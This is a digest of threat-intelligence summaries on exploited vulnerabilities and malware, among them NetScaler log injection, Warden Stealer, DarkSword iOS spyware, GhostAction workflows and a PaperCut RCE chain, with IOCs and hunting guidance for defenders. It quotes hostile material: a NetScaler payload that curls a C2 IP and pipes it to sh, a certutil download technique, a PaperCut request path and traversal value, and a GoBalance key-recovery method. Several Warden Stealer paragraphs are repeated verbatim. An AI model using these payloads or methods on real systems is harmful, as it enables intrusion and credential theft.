item.title: NetScaler C2: A Massive CVE-2026-88771 Exploitation Operation
item.description:
CVE-2026-88771 (CVSSv4 9.5) in Citrix NetScaler ADC and Gateway is actively exploited by a Chinese-speaking actor using a fully autonomous mass-exploitation C2 framework built to infect up to 120,000 candidate appliances per run.
Key findings:
- CVE-2026-88771 is a log injection flaw, not a traditional buffer overflow. Attacker-controlled text in login fields and User-Agent headers on unauthenticated HTTP endpoints is written to ns.log and later parsed by the background daemon admautoregd through a grep/sed/awk/find chain. Because the username field is logged verbatim, an attacker crafts a string matching pitboss NSPPE-00; then injects a command, then closes with ;# unexpectedly died. The daemon splits on semicolons and executes the middle segment as root. The daemon runs on a 24-hour cycle or at reboot, so exploitation can be silent for up to 24 hours after injection. Affected builds are NetScaler ADC and Gateway before 14.1-73.37, 13.1-64.23, and FIPS/NDcPP before 13.1-37.279.
- The NetScaler C2 toolkit, identified in the wild by SOCRadar on October 1, four days after disclosure, is a four-script modular pipeline. targets[.]py queries FOFA across 12 searches (up to 120,000 candidate hosts), probe[.]py fingerprints version via nsversion, NSC_ cookie, and /vpn/index.html comments, exploit[.]py fires the log injection across 11 unauthenticated endpoints simultaneously using two payload variants, and c2_server.py runs a dual HTTP (port 8899) and DNS (port 53) listener. The orchestrator run[.]sh manages all three threads via Tmux and loops every 30 minutes. MITRE TTPs in the report include T1596.005, T1190, T1059.004, T1036.005, T1543, T1041, T1132.001, T1105, T1071.001, and T1071.004.
- The injected HTTP payload is: {"login":{"username":"pitboss NSPPE-00;curl${IFS}-sk${IFS}45.143.130[.]195:8899/s/<bid>|sh;# unexpectedly died","password":"x"}}. On callback, the bootstrap fetches an agent from hxxp://45.143.130[.]195:8899/a/<bid>, drops it at /tmp/.nsagent, and daemonizes it. The agent registers at /p/<bid>?h=<hex_hostname>&u=<hex_username>&src=agent, polls /c/<bid> every 20 seconds, and exfiltrates results hex-encoded via /r/<bid>?d=<hex>. The DNS OOB fallback injects nslookup <bid>.p1.oob.45.143.130[.]195 for appliances with blocked egress. Code comments and UI strings are in Simplified Chinese 🇨🇳; the report notes AI usage in development.
- Six SHA256 hashes for the toolkit files are in the report (run[.]sh, targets[.]py, probe[.]py, exploit[.]py, c2_server.py, pollctl[.]py). The single C2 IP is 45.143.130[.]195. The bid value identifying each victim is the first 8 characters of the MD5 hash of the victim's IP:PORT.
Hunt on your NetScaler appliances now. Search all ns.log archives for the strings pitboss NSPPE-00;, /s/<bid>|sh, and ;# unexpectedly died. Check for outbound connections to 45.143.130[.]195 on ports 8899 and 53, and in proxy or network logs look for the C2 URL path patterns /s/, /a/, /p/, /c/, and /r/ with short hex bid values. Inspect /tmp/ for .nsagent and review running processes for unexpected shells. Because admautoregd may delay execution up to 24 hours, widen your connection search window accordingly. If you find any indicator, preserve ns.log and process state before isolating. IOCs and behavioral indicators are in the SOCRadar report. Patch to 14.1-73.37 or 13.1-64.23 (or the corresponding FIPS/NDcPP builds) as the final remediation step after eradication.

item.title: Hunting Citrix NetScaler Zero-Days with Corelight: Part 2
item.description:
CVE-2026-88772 in Citrix NetScaler is a DTLS memory overflow zero-day. Existing Zeek analyzer logs already record a diagnostic that can surface exploitation attempts, including in traffic captured before the vulnerability was publicly disclosed.
Key findings:
- CVE-2026-88772 is a memory overflow in NetScaler's DTLS processing. Crafted handshake records declare small fragment lengths while carrying substantially more data, overflowing a fixed-size buffer. The malformed bytes are visible before encryption, so Zeek's DTLS analyzer can inspect them without decryption.
- The Zeek analyzer.log captures the mismatch as a concrete, searchable failure reason: "DTLS handshake record length does not match packet length" with analyzer_name=DTLS and proto=udp. The linked ssl.log record, joined by the same connection UID, showed ssl_history=CvCl, last_alert=protocol_version, and established=F in the tested PoC replay. Neither field alone confirms exploitation, but together they narrow scope.
- The hunt query for LogScale is: path=analyzer | analyzer_name="DTLS" | proto="udp" | failure_reason="DTLS handshake record length does not match packet length". Deployments retaining events under dpd can use path=/^(analyzer|dpd)$/ with the same analyzer_name and failure_reason filters, plus cause="violation" OR proto="udp". Note that older native dpd.log records use the field name analyzer, not analyzer_name, so field mapping needs adjustment before running operationally.
- Once a matching diagnostic is found, use the connection UID to pull the corresponding conn.log and ssl.log records from the same sensor and time window. Confirm whether the destination is a NetScaler listener using the asset discovery steps from Part 1 (TLS names, certificates, observed DTLS sessions, HTTP fingerprints). Then check the appliance's software version against the vendor advisory and correlate the diagnostic timing with appliance errors, process restarts, and unexpected outbound connections to assess impact.
- A normal DTLS cookie exchange produces CvC in ssl_history. The PoC replay produced CvCl with a server-side protocol_version alert and no established session. That divergence is worth investigating but does not by itself prove the overflow succeeded. Appliance-side evidence is required to assess outcome.
Practitioner takeaway: if your deployment retains analyzer.log or dpd.log, you can hunt this now, including against historical traffic predating the disclosure. Run the LogScale query above, pivot on connection UIDs to ssl.log and conn.log, and reconcile destinations against your NetScaler inventory and virtual IP mappings. Correlate hits with appliance errors and unexpected subsequent connections to assess whether the overflow was triggered. Patching remains required per the NetScaler security bulletin.

item.title: Leaking the Keys to the Kingdom: How a Single Slip Handed Over a Darknet Empire
item.description:
A cryptographic flaw in GoBalance, a Go-based re-implementation of OnionBalance used across darknet infrastructure, allowed full recovery of a site's master signing scalar from publicly available descriptor data alone.
Key findings:
- The root cause is a truncation bug in GoBalance's Tor-format key handling. When signing descriptors, Seed() returns only the first 32 bytes of the 64-byte expanded ed25519 key, silently dropping the nonce prefix h. This makes the signing nonce r a fixed, publicly computable constant derived from the SHA-512 of a static string, reducing each signature to a linear equation with one unknown: the secret scalar a. An attacker fetches a published descriptor, reads R, S, M, the blinding nonce, and the blinded public key, then solves for the blinded scalar and reverses the blinding factor to recover the master identity scalar.
- Between 5 and 7 October 2026, Dread's two onion addresses ("dreadytofat" and "dreadlands") were taken over and redirected to a rival platform, Conclave. The compromise of the second address, a VIP mirror stood up specifically as a safe fallback, is the key forensic signal here: a single accidental key upload explains losing one address, not two. HugBunter later confirmed a GoBalance zero-day was used against multiple darknet services, with AI reportedly used by both the attacker and Dread's team in identifying the flaw.
- The flaw lives in two files: pkg/stem/descriptor/hidden_service.go (the blindedSign branch that calls BlindedSignWithTorKey) and pkg/onionbalance/tor_ed25519.go (where the full 64-byte key is loaded from disk). The bug affects every released version of GoBalance. The original OnionBalance and Tor itself are not affected. No server access, database access, or credential theft is needed to exploit it: the attack surface is the publicly fetchable descriptor.
- Control of the signing scalar lets an attacker serve arbitrary content at the onion address and position themselves for a MiTM against users connecting to what appears to be the legitimate site. It does not, by itself, give access to backend servers or stored data. HugBunter said he did not believe traffic was intercepted during the Dread incident, but could not rule it out, and advised users to rotate passwords on Dread and other affected services. Multiple additional marketplaces, including defunct ones whose descriptors were still reachable, reportedly had their addresses taken over in the same window.
DFIR takeaway: Any service that ran GoBalance at any point should be treated as potentially affected, even if it is no longer active. For active services, check descriptor publication history for time periods where the signing address changed unexpectedly or began resolving to unfamiliar content. The smoking gun for this attack is the mathematical relationship between published signatures: if the nonce r was fixed, signatures across descriptors share a computable structure. For incident responders assisting affected operators, preserve all published descriptors and their timestamps before rotating to a new address ("dreadohbles" is the replacement Dread stood up).

item.title: Forensic Acquisition of MediaTek-Based Android Devices
item.description:
MediaTek BootROM vulnerabilities enable physical extraction and offline passcode recovery from FBE-protected Android devices, opening acquisition paths unavailable through standard logical methods.
Key findings:
- The MTK dump method exploits BootROM (BROM) vulnerabilities present in a specific list of MediaTek chipsets, from MT6731 through MT8785, to gain low-level device access before Android initializes. At that stage the tool can pull a physical image of all partitions, including userdata, and extract the cryptographic material needed to decrypt file-based encryption (FBE). Legacy full-disk encryption (FDE) support is not yet available.
- Entering BootROM mode is the most device-specific step and the most common failure point. Some models accept a volume-button-plus-USB combination while powered off; others require shorting hardware test points on the motherboard after disassembly. Even devices sharing the same chipset may need different procedures, so the correct method must be confirmed before acquisition begins. Failure to connect does not require restarting the acquisition process unless the tool explicitly reports failure.
- The workflow separates acquisition from decryption deliberately, which matters for evidence handling. The physical image is preserved first, and passcode recovery or decryption happens afterward as a separate case operation. This means an examiner can hand off the raw dump and work the decryption independently, preserving the original acquisition for chain-of-custody purposes.
- Passcode recovery runs offline against the extracted cryptographic material rather than against the live device, so Android lockout timers and attempt limits do not apply. The tool tests approximately 60 candidates per second on most supported chipsets, or about 30 per minute on certain models. Options include a built-in dictionary that prioritizes common 4- and 6-digit numeric codes, sequential numeric brute-force starting from 0000, and a custom .txt dictionary that also supports alphanumeric passcodes. The recovered passcode appears in the MTK brute-forcing task log.
- Chipset support does not guarantee acquisition success. Manufacturers can layer additional protections that block BootROM connection or deny access to the cryptographic keys even on a nominally supported chipset. When an image was acquired separately using MTKClient, the extracted keys must be converted before decryption is possible.
Practitioner takeaway: on a seized MTK-based Android device, identify the chipset before you begin, MediaTek identifiers start with MT, and confirm whether it appears on the supported list. If the model requires test-point access, document the disassembly and photograph the board before touching anything. Acquire the physical image first and store it before any decryption attempt, so your case has an untouched baseline. When passcode is unknown, check the lock screen for an indicated length to constrain the brute-force and start with the dictionary attack before sequential numeric. The recovered passcode and task log are your documentary evidence of how decryption was achieved, preserve both.

item.title: Warden Stealer: The Rapid Rise of an Infostealer with an Appetite for AI Agent Data
item.description:
Warden Stealer, a Rust-written MaaS infostealer active since May 2026, has surged to become one of the most prevalent stealers observed in the wild, now explicitly targeting AI agent config files, tokens, and MCP credentials alongside traditional browser data.
Key findings:
- Warden Stealer combines a built-in custom loader and cryptocurrency clipper with broad credential-theft capabilities covering Chromium/Gecko browsers, 200+ crypto wallet extensions, and 360+ other targets including messengers, password managers, 2FA tools, and VPN clients. What sets it apart is explicit targeting of local AI agent data from tools such as Claude, Codex, Grok, and Cursor, including access and refresh tokens, MCP-stored credentials, prompt histories, and conversation databases. Version 1.9 (announced September 29, 2026) formally built this in. The stealer is advertised on Russian-language underground forums with approximately 110 active operators and a tiered pricing model now reaching $1,500/month for Enterprise. It deliberately avoids CIS and Baltic systems.
- The loader, assessed as in-house developed, reconstructs the stealer DLL in memory and injects it into the process owning the Shell_TrayWnd window (typically explorer.exe) via VirtualAllocEx with PAGE_EXECUTE_READWRITE, WriteProcessMemory, and CreateRemoteThread. It manually maps the PE and links it into PEB->Ldr->InLoadOrderModuleList and PEB->Ldr->InMemoryOrderModuleList to evade module enumeration. Loader binaries are deliberately file-inflated with large PE overlays to bypass size-limited scanning in AV, EDR, and sandbox environments. The stealer payload is embedded in the loader's .rdata section encoded with a build-unique Base64-like alphabet and LZSS-style compression.
- The ABE bypass scans the target browser's memory for the four-byte sequence v20\x00 to locate the v20_master_key within Chromium's os_crypt_async::Encryptor::KeyRing, validates candidates by checking std::vector pointer layout at offsets +32, +40, and +48 from each match, then hijacks an existing browser thread (suspend, save context, redirect instruction pointer to injected shellcode), and calls CryptUnprotectMemory with CRYPTPROTECTMEMORY_SAME_PROCESS inside the browser process to decrypt the key in place.
- For secondary payload delivery, Warden Stealer uses certutil.exe -urlcache -split -f to download files to %TEMP% with filenames derived from GetTickCount formatted as eight hex digits plus a URL position index, then launches them via the Shell.Application COM object's IShellDispatch2 ShellExecute method calling cmd.exe with SW_HIDE. Watch for certutil.exe spawned by cmd.exe with /c and -urlcache -split -f arguments, with a parent chain tracing back to a process that itself was injected into explorer.exe.
- Anti-VM evasion checks SMBIOS for absence of Type 7 Cache Information records, queries cpuid leaves 0 and 0x40000000 against a blacklist of 27 hypervisor vendor signatures (VMware, VirtualBox, KVM, Xen, QEMU), and enumerates Uninstall registry keys under HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall and its WOW6432Node equivalent for DisplayName values beginning with Virtio, plus EnumDisplayDevicesW for Virtio, Standard VGA, or Basic Display adapter strings. On VM detection it fires a Russian-language message box titled DEBUG and aborts data collection.
Hunt across your environment for explorer.exe with memory regions flagged PAGE_EXECUTE_READWRITE created by a non-child process, certutil.exe spawned with -urlcache -split -f under a cmd.exe whose parent is a recently injected process, and HTTPS C2 beaconing to the 50 defanged domains listed in the report. A full IOC list including additional loader hashes (ten listed: 006510ce1da2b7410376f0788c19e55616eb4bcc30072d25b7d0871dc32aa11c and others) and stealer hashes (ten listed, starting fea9538084b70e9681fd8104b9319792c4d8c2701ae145ec31dc26e7526f2ae0) is on the Gen Threat Labs GitHub. For any AI-agent-adjacent compromises, immediately audit local config paths for Claude, Cursor, Codex, and Grok for evidence of file access, and treat any exfiltrated MCP configuration as a full credential compromise requiring token rotation.

- For secondary payload delivery, Warden Stealer uses certutil.exe -urlcache -split -f to download files to %TEMP% with filenames derived from GetTickCount formatted as eight hex digits plus a URL position index, then launches them via the Shell.Application COM object's IShellDispatch2 ShellExecute method calling cmd.exe with SW_HIDE. Watch for certutil.exe spawned by cmd.exe with /c and -urlcache -split -f arguments, with a parent chain tracing back to a process that itself was injected into explorer.exe.

- Anti-VM evasion checks SMBIOS for absence of Type 7 Cache Information records, queries cpuid leaves 0 and 0x40000000 against a blacklist of 27 hypervisor vendor signatures (VMware, VirtualBox, KVM, Xen, QEMU), and enumerates Uninstall registry keys under HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall and its WOW6432Node equivalent for DisplayName values beginning with Virtio, plus EnumDisplayDevicesW for Virtio, Standard VGA, or Basic Display adapter strings. On VM detection it fires a Russian-language message box titled DEBUG and aborts data collection.

Hunt across your environment for explorer.exe with memory regions flagged PAGE_EXECUTE_READWRITE created by a non-child process, certutil.exe spawned with -urlcache -split -f under a cmd.exe whose parent is a recently injected process, and HTTPS C2 beaconing to the 50 defanged domains listed in the report. A full IOC list including additional loader hashes (ten listed: 006510ce1da2b7410376f0788c19e55616eb4bcc30072d25b7d0871dc32aa11c and others) and stealer hashes (ten listed, starting fea9538084b70e9681fd8104b9319792c4d8c2701ae145ec31dc26e7526f2ae0) is on the Gen Threat Labs GitHub. For any AI-agent-adjacent compromises, immediately audit local config paths for Claude, Cursor, Codex, and Grok for evidence of file access, and treat any exfiltrated MCP configuration as a full credential compromise requiring token rotation.

item.title: Sleep, Beacon, Steal, Repeat - The Story of P7 DarkSword Variant
item.description:
P7 DarkSword, a previously unseen iOS spyware variant, adds on-device keychain extraction, crypto-wallet theft, and two-way C2 communication while shrinking its forensic footprint compared to prior DarkSword builds.
- P7 DarkSword is injected into the SpringBoard process and beacons to its C2 at hxxps://agdx53[.]cc every 15 seconds via POST /beacon over HTTP/1.0. The beacon interval is operator-adjustable via a sleep command. All requests carry a hardcoded User-Agent string spoofing iPhone OS 18_5 and use HTTPS without strict certificate validation. Exploit delivery originates from hxxps://cdn.gotoiphone[.]com and hxxps://mzpo30[.]cam/assets/js/group[.]html. The variant name comes from the p7_ variable prefix the authors used in their code modifications, which the iVerify report notes reflect genuine developer competence rather than AI-assisted copy-paste work.
- The theft capability is meaningfully broader than earlier DarkSword builds. Previous versions copied the raw keychain database to C2 for server-side decryption. P7 decrypts and serializes keychain entries into JSON on the device itself, writing the result to /private/var/tmp/keychain_c2_dump.json and signaling readiness to the agent via a 4-byte marker file at /private/var/tmp/keychain_c2_dump.done. A dedicated wallet_extract command targets the imToken wallet app, and wallet_scan enumerates other installed wallet applications before exfiltration via POST /war.
- The implant uses browser localStorage as an anti-reinfection mechanism, storing lab_device_uuid under cdn.gotoiphone[.]com and _x_pe_done under mzpo30[.]cam. It also suppresses the HTTP debug logging and syslog output present in earlier variants, and reduces process injection count, all deliberate moves to lower the on-device noise that behavioral detections rely on.
- Filesystem artifacts are specific and actionable. In addition to the keychain dump files, the implant writes /private/var/tmp/p7_debug.log (the keychain-theft phase journal), /private/var/tmp/c2_wallet_debug.log (the decryption pipeline trace), and staged copies of Apple Notes databases under /private/var/tmp/ (_hq_notestore, notes.sqlite, and their WAL and SHM files). The disk_scan command writes a full filesystem metadata report to /var/mobile/Library/Caches/ios_disk_scan.txt before uploading it in chunks and unlinking it.
- The broader Coruna and DarkSword infrastructure documented in the report is extensive: dozens of iframe-host and DarkSword-host domain pairs, scores of C2 URLs across multiple operators, and hash tables for rce_loader.js, rce_module.js, rce_worker variants for iOS 18.4 through 18.7, sbx0_main, sbx1_main, pe_worker, and the P7-specific c2_agent.js and keychain_copier.js modules from both exploit origins.
For triage on a suspected device, check /private/var/tmp/ for keychain_c2_dump.json, keychain_c2_dump.done, p7_debug.log, c2_wallet_debug.log, and the NoteStore and notes.sqlite copies. Network-side, hunt for POST requests over HTTP/1.0 to /beacon, /war, /nb, or /p with the hardcoded User-Agent containing "CPU iPhone OS 18_5." The full IOC set, domain pairs, and component hashes are in the iVerify report.

item.title: A Loader With No Command Line
item.description:
A signed Python interpreter ran with no arguments and no script path, hiding its loader configuration entirely inside a ._pth file so process telemetry showed nothing but a bare executable path.
Key findings:
- The delivery chain started with a Yahoo Mail shared-message link (mobile.mail[.]yahoo[.]com), a legitimate domain with decades of reputation, carrying no attacker infrastructure whatsoever. SafeLinks rewrote and allowed it correctly. The lure domain only appeared after the click: ssa-administrator.update-servicessd[.]xyz, impersonating the US 🇺🇸 Social Security Administration. The downloaded ZIP carried per-victim build identifiers stamped through every filename, meaning a recovered sample can be tied to a specific download token and two samples with different identifiers are the same kit, not two families. The IPs resolving that domain (104.21.28[.]54 and 172.67.144[.]68) are shared Cloudflare infrastructure, do not block them.
- The loader trick depends on a documented CPython behavior, not an exploit. When pythonw.exe (SHA-256: 32890fc3efa6d92121da340d64417db068db2dceacfe61f663981adcd596b2e4, legitimately signed by the Python Software Foundation, do not block) finds a python312._pth beside it, the interpreter enters isolated mode and builds sys.path exclusively from that file. The attacker's ._pth pointed sys.path at DocumentResources.dat, an importable archive carrying the actual code. Because site is re-enabled at the end of the file, Python's startup sequence runs sitecustomize from that archive before any main program. The entire entry point is in a text file, not an argument, so the process command line reads only as the executable path and nothing else.
- Sysmon event ID 11 logged the ._pth file creation by path only, no contents. Event ID 15, better known for alternate data streams, carried both the file body and its hash, and also fired separately for python312._pth:Zone.Identifier to record the mark-of-the-web. Collecting event 11 alone leaves you knowing a ._pth appeared without ever learning what was in it. The mark-of-the-web on the ZIP itself recorded the full download URL including the per-victim token, which is recoverable forensically from Zone.Identifier streams on the archive.
- Once running, the batch file (sosialsecuritysystem_[build].bat) was a polyglot: to cmd.exe a script, to PowerShell a container. A single embedded PowerShell line used Get-Content -Raw, LastIndexOf against sentinel strings (<<<16hex>>> fences), FromBase64String, and a byte-by-byte XOR with 0xFA to carve and write doc.msi to %TEMP%\[8 lowercase letters]\. No second-stage download, no staging URL in DNS, nothing on disk to scan until that line runs. The MSI was ScreenConnect 25.2.4.9229 built for attacker instance d256261751f05b74. The UAC bypass attempted the ms-settings CurVer fodhelper.exe hijack (HKCU\Software\Classes\ms-settings\CurVer), writing and deleting the registry keys within 20 seconds, far too fast for a scheduled registry audit to observe. The elevation failed twice: a privilege management product blocked fodhelper.exe before it launched, and the user held no linked elevated token anyway. Everything in the chain ran at medium integrity. A victim check-in via Windows-native curl.exe to /report2.php disclosed hostname, username, OS, and AD domain name.
- The attacker wrote exactly three files, none of them a PE: two ._pth configuration files and DocumentResources.dat (never recovered). The only hashes available from this intrusion belong to legitimate PSF-signed binaries. AV had nothing to key on. The first detection that fired was attrib +h +s hiding the batch file and decoy PDF, and the second was the base64 decode PowerShell command, both after the payload was already on disk. What actually stopped the intrusion was a standard user account with no local admin rights and a privilege management policy blocking auto-elevating binaries.
Hunt this now: alert on any process whose ORIGINAL_FILE_NAME is pythonw.exe, python.exe, node.exe, or similar runtime executing with a command line consisting solely of its own path, scoped to paths under \Users\. Then query for ._pth file creation events in Downloads, Desktop, or %TEMP% paths and pull event ID 15 (not just 11) to recover file contents. Hunt for msiexec /a with a TARGETDIR under a user profile, and alert on ScreenConnect.ClientService.exe appearing outside approved install paths. For the UAC bypass, make sure your HKCU\Software\Classes\ms-settings\CurVer rule alerts on the reg add, not only the cleanup delete. Full IOC list and ATT&CK technique mappings (T1566.002, T1204.002, T1036.005, T1564.001, T1140, T1059.001, T1059.003, T1548.002, T1218.007, T1219, and others) are in the report.

item.title: Credential-Stealing GitHub Actions Workflows Planted in Tens of Thousands of Repositories
item.description:
GhostAction supply chain campaign hits tens of thousands of GitHub repos, stealing CI/CD secrets, cloud keys, and API tokens via malicious "security audit" workflows injected under compromised maintainer identities.
Key details:
- GhostAction, first surfaced in September 2025, has now expanded dramatically. As of October 9, 2026, more than 500 GitHub accounts have committed malicious workflows to tens of thousands of repositories since October 7, 2026. Two high-profile maintainer accounts were the initial pivot: Takashi Kitao (author of the 18,400-star pyxel engine) pushed the workflow to 27 repos starting 13:20 UTC, and Henry Wu (henrywoo, original author of Uber's athenadriver) was used to hit 318 repositories in a 16-minute window between 21:10 and 21:26 UTC the same day. Earlier campaign data from August 31 through September 30, 2026 shows 772 public repos across 373 GitHub users and organizations compromised, targeting 2,577 secrets.
- The attack chain begins with attacker acquisition of a maintainer's GitHub credentials, most likely a leaked personal access token pulled from infostealer logs or credential dumps. The attacker scans the target repo's existing workflow files for secrets during reconnaissance, then injects one of two workflow files directly into the default branch under the victim's own identity: security-audit.yml or github_actions_security.yml. The workflow triggers on workflow_dispatch and any unfiltered push across all branches and tags, checks out with fetch-depth: 0 to pull full git history, then runs a single "Audit" step that extracts named GitHub Actions secrets, scans the working tree for 13 credential patterns, sweeps the entire git history for the same patterns, and pairs AWS access key IDs with their matching secret access keys before exfiltrating everything via curl over plain HTTP to the hard-coded C2 at 193.32.204[.]199.
- The credential scope is broad and deliberate: AWS keys, Anthropic, OpenAI, and OpenRouter API keys, GitHub and GitLab tokens, SSH private keys, Azure credentials, DockerHub and GHCR credentials, database credentials, FTP credentials, Google Cloud and Firebase credentials, GitHub tokens, Telegram, Slack, and Discord bot tokens, and keys for Cloudflare, npm, PyPI, and other AI providers. The previous campaign wave alone exfiltrated 3,325 secrets including PyPI, npm, and DockerHub tokens. On August 30, 2026, at least one repository, kuafuai/DevOpsGPT, was also modified to embed an XMRig cryptocurrency miner in the project's Docker image, demonstrating that credential theft is not the only payload objective.
- Forks represent a critical and underappreciated exposure surface. The 279 forks in the henrywoo namespace each carry the malicious workflow file. If GitHub Actions are enabled on a fork, any subsequent push can trigger credential harvesting. Critically, every run returns a repository identifier whether or not credentials are found, meaning the operator is building a map of reachable execution contexts independent of theft success. Private forks and downstream mirrors are the highest-risk targets because private repositories are where committed credentials actually live.
Practitioners should immediately search all repositories for security-audit.yml or github_actions_security.yml committed on or after August 31, 2026. Treat any hit as a confirmed compromise: revoke the associated GitHub credential, rotate all secrets referenced in that repository's Actions configuration and git history, delete the workflow from every branch, and audit all forks for inherited copies. Hunt git history for the 13 credential pattern categories the workflow targets, since the attacker already swept them and you need to know what was exposed, not just what was checked in today. The C2 IP 193.32.204[.]199 should appear in any network logs from CI/CD runners if the workflow executed. Full IOC and account lists are in the StepSecurity, Socket, and GitGuardian reports.

item.title: Threat actors exploit AhsayCBS zero-days
item.description:
Two AhsayCBS zero-days are chained to achieve unauthenticated SYSTEM-level RCE on backup management servers, with active exploitation confirmed and public PoC already circulating as of October 7, 2026.
Key findings:
- CVE-2026-105133 (CVSS 5.5) is an improper authentication flaw in the checkSysPwd function. CVE-2026-105134 (CVSS 9.3) is an OS command injection vulnerability in the Replication Receiver component. Chained together by a remote, unauthenticated attacker, they allow full SYSTEM-level command execution on Windows-hosted AhsayCBS servers without credentials or user interaction. Versions through 10.3.4 were confirmed vulnerable at time of disclosure, and public proof-of-concept code was available from the moment the vulnerabilities were published.
- The observed attack chain moves fast: exploit the authentication bypass, configure a malicious replication receiver via the API, drop a JSP web shell into application directories, then execute commands as NT AUTHORITY\SYSTEM. Post-exploitation has included reconnaissance, XMRig cryptocurrency miners disguised as Microsoft Edge processes, creation of a fake Edge update service for persistence, and PowerShell scripts designed to conceal mining activity. Five organizations were identified as compromised within the first day of reporting.
- For DFIR responders, AhsayCBS compromise is not just a miner cleanup job. The server maintains live connections to backup destinations, storage systems, domain services, and privileged service accounts. That makes it a pivot point, not just a victim host. Confirmed access level is equivalent to owning the underlying OS, which means credential material, backup repository access, and potentially lateral movement paths into everything the platform touches.
- Detection focus: hunt for unexpected JSP files inside AhsayCBS application directories, suspicious child processes spawned by cbssvcX64.exe, unauthorized Replication Receiver configurations, anomalous PowerShell execution originating from the backup service context, and outbound connections to cryptomining pools. The fake Edge update service is a persistence artifact worth pulling from the services registry and correlating against known-good Edge update paths.
Takeaway: Treat any exposed AhsayCBS instance as potentially compromised from October 7 onward. Identify all deployments including DR, test, and secondary environments, isolate management interfaces from external access immediately, and do not stop at removing XMRig. Rebuild compromised hosts from known-good media before redeploying the application, since post-exploitation changes may survive a software update alone. The backup management plane is a high-value target during ransomware recovery, and an attacker who owns it before an incident becomes a serious problem during one.

item.title: P7 DarkSword iOS Exploit Kit Adds Crypto Wallet Data Theft and Remote Commands
item.description:
P7 DarkSword, an evolved iOS exploit kit variant, adds two-way C2, keychain exfiltration, and crypto wallet theft targeting iPhones, with infrastructure exposing 179 device loot directories and 11 recovered seed phrases.
Key findings:
- P7 DarkSword chains CVE-2025-24201 (WebKit out-of-bounds write, sandbox escape, fixed in iOS 18.3.2) and CVE-2025-31200 (Core Audio memory corruption enabling code execution, fixed in iOS 18.4.1) to break out of the browser sandbox, escalate to kernel privileges, and inject into SpringBoard, the iOS process managing the home screen and app launches. The implant lives inside SpringBoard and handles all C2 communication from there, polling for commands every 15 seconds. Forensically, SpringBoard process anomalies and unexpected network beaconing from that process are your first signal.
- The command set is extensive. Operators can execute OS commands (ls, cat, ps, memdump, netstat, whoami), recursively scan the full filesystem from "/", upload files from /var/mobile/Media/DCIM, extract Apple Notes databases, pull iCloud Keychain as JSON pre-exfil, scan and extract crypto wallet data including imToken and BitKeep recovery phrases and keystore data, and enumerate all installed app sandbox containers. Previous variants exfiltrated the raw keychain database; P7 processes it on-device into JSON first, reducing the network footprint and making passive interception harder.
- Censys identified five open-directory hosts exposing kit components: 43.134.165[.]205 (DS-Fusion v1.0, a DarkSword plus Coruna combined bundle), 166.88.95[.]90 (active C2 with two Chinese 🇨🇳 iOS devices beaconing every 3 seconds on September 6, 2026), 23.148.212[.]237 (operator workspace developing iOS 26 exploit chains including CVE-2026-31001), 47.102.192[.]23 (Coruna staging), and 156.239.230[.]120 (full C2 platform, active September 15, 2026). Coruna is the companion payload kit delivering in-browser wallet harvesting after DarkSword's exploit stages land. A separate operator is running the kit against 66ds[.]lol, on Tencent and Shenyang hosting, tied through a unique self-signed certificate authority, and adding BitKeep as a new wallet target.
- The platform exposes an agent/reseller exploitation-as-a-service model. The recovered production server held 11 victim crypto recovery phrases, 179 device loot directories, and a 75-account control-plane roster. Known campaigns have targeted Saudi Arabia 🇸🇦, Turkey, Malaysia 🇲🇾, and Ukraine 🇺🇦, with attributed actors including Turkish 🇹🇷 commercial surveillance vendor PARS Defense (via a fake Snapchat-themed site), Russian-aligned Star Blizzard using fake invitation lures, and a Chinese-speaking threat actor serving fake Apple ID sign-in pages. The kit itself is assessed as a commercial product that reached a secondary market and has been acquired by multiple financially motivated operators since late 2025.
- Stealth improvements in P7 include eliminating debug logging over HTTP and syslog, and using browser localStorage to suppress re-exploitation of the same device. These changes directly reduce the on-device artifact trail. On managed or jailbreak-detected devices, look for SpringBoard making outbound connections, unexpected JSON blobs staging in accessible locations, and localStorage entries tied to exploit delivery pages.
Practitioner takeaway: any iPhone not yet on iOS 18.4.1 is exposed to both CVEs in this chain. For incident response on a potentially compromised device, iVerify's report contains IOC details including the defanged infrastructure IPs above. Hunt for SpringBoard network activity, review mobile threat defense telemetry for keychain access anomalies from non-standard processes, and treat any device with wallet apps that accessed a suspicious web page in the relevant window as a potential seed phrase compromise requiring immediate wallet rotation.

item.title: Death By A Thousand PaperCuts (PaperCut Pre-Auth RCE Chain and Patch Bypasses WT-2026-0141-0144/CVE-2026-82077/CVE-2026-82078/CVE-2026-81578)
item.description:
PaperCut pre-auth RCE confirmed exploited in the wild, with four successive patch bypasses chained across a three-week saga. Two new vulnerabilities (WT-2026-0143 + CVE-2026-82077) remain undocumented until now.
Key findings:
- The original in-the-wild chain against PaperCut NG 26.0.3 combined CVE-2026-81578 (Authentication Bypass) and CVE-2026-82078 (Post-Auth RCE), giving unauthenticated attackers full code execution. PaperCut published an advisory on 27 August 2026 with IOCs but no patch, leaving customers exposed. PaperCut has prior CISA KEV entries and ransomware gang attention, making this a high-priority target set.
- The auth bypass class stems from Apache Tapestry 3, a framework obsolete for roughly 20 years. PaperCut's authorization logic in BasePaperCutPage.pageValidate only checks the root page in the service parameter chain, not subsequent pages. An attacker sends a single crafted request like /app?service=direct/1/Home/SetupAdmin/$Form to reach Setup Wizard forms post-deployment, reset the admin password via four sequential POST requests, and bypass system.setup-completed entirely. This is WT-2026-0143, a bypass of the bypass of CVE-2026-81578, and it was not assigned a CVE.
- The new RCE (WT-2026-0144 / CVE-2026-82077, patched in 26.0.5) lives in the Scan to Fax feature. FaxProviderManagerImpl.sendFaxJob passes the attacker-controlled providerConnector field through getAbsoluteBinaryPath with no validation, appending it directly to the fax connector directory path. This is a relative path traversal: setting providerConnector to ..\..\..\..\Windows\System32\cmd and controlling system.scan.fax.send.command-args via the Config Editor (reached post-auth-bypass) achieves OS command execution through ProcessUtils.execAndGetOutput.
- The full unauthenticated RCE chain against 26.0.4-PO build 76508 combines WT-2026-0143 (auth bypass via Home page and Setup Wizard) then CVE-2026-82077 (path traversal into cmd.exe via Scan to Fax). The Config Editor page was also exploited in the wild in the original chain, meaning POST requests to /app with a manipulated service parameter and scanActionType=FAX are your hunting ground in proxy and web server logs.
- Watchtowr's Detection Artifact Generator (DAG) is available on their GitHub and tests exposure to the authentication bypass chain without executing the full RCE. The definitive patched version is 26.0.5. If you are on any 26.0.4 build or earlier, treat the system as compromised until confirmed otherwise.
